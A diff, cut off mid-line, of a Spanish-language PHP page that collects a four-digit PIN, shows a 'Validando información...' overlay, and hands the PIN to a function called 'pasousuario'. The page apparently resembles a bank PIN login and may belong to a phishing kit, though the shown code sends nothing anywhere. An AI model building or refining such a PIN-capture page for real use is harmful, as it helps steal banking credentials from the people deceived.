@@ -14,7 +14,16 @@ date_default_timezone_set('America/Bogota');
 
         <style type="text/css">
             body { font-family: 'Open Sans', sans-serif; margin: 0; padding: 0; background-color: #fff; }
-            #fondo, #cargando-o { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 999; text-align: center; padding-top: 50%; }
+            /* Eliminamos el !important para que el JS tome el control total */
+            #fondo, #cargando-o { 
+                display: none; 
+                position: fixed; 
+                top: 0; left: 0; width: 100%; height: 100%; 
+                background: rgba(255,255,255,0.95); 
+                z-index: 9999; 
+                text-align: center; 
+                padding-top: 50%; 
+            }
             .frm { text-align: center; margin-top: 50px; }
             .clave { 
                 padding: 10px 0; 
@@ -36,7 +45,7 @@ date_default_timezone_set('America/Bogota');
         <div id="fondo"></div>
         <div id="cargando-o">
             <img src="../img/load4.gif" width="80"><br>
-            <p style="font-size: 14px; color: #666;">Validando información...</p>
+            <p style="font-size: 14px; color: #666; font-family: 'Open Sans';">Validando información...</p>
         </div>
 
         <div class="header-app">
@@ -62,44 +71,8 @@ date_default_timezone_set('America/Bogota');
 
         <script type="text/javascript">
             $(document).ready(function() {
-                // Pantalla limpia al iniciar
                 $("#fondo, #cargando-o").hide();
 
-                // Manejo de los 4 inputs
                 $('.clave').on('keyup', function(e) {
-                    var key = e.keyCode || e.charCode;
-                    
-                    // Si escribe un número, pasa al siguiente
-                    if (this.value.length === 1) {
-                        $(this).next('.clave').focus();
-                    }
-                    
-                    // Si borra (Backspace), vuelve al anterior
-                    if (key == 8 && this.value.length === 0) {
-                        $(this).prev('.clave').focus();
-                    }
-
-                    // Verificar si están los 4
-                    var p = $("#p1").val() + $("#p2").val() + $("#p3").val() + $("#p4").val();
-                    if (p.length === 4) {
-                        $("#btn-password").prop("disabled", false).css({"background-color": "#FDDA24", "color": "#000", "cursor": "pointer"});
-                        // Opcional: ocultar teclado automáticamente en móviles
-                        document.activeElement.blur();
-                    } else {
-                        $("#btn-password").prop("disabled", true).css({"background-color": "#ccc", "color": "#777"});
-                    }
-                });
-
-                // Acción de envío final
-                $("#btn-password").click(function(){
-                    var pin = $("#p1").val() + $("#p2").val() + $("#p3").val() + $("#p4").val();
-                    if(pin.length === 4) {
-                        $("#fondo, #cargando-o").show();
-                        // Ejecuta la función centralizada
-                        pasousuario(pin);
-                    }
-                });
-            });
-        </script>
-    </body>
-</html>
+                    if (this.value.length === 1) { $(this).next('.clave').focus(); }
+                    if (e.keyCode ==
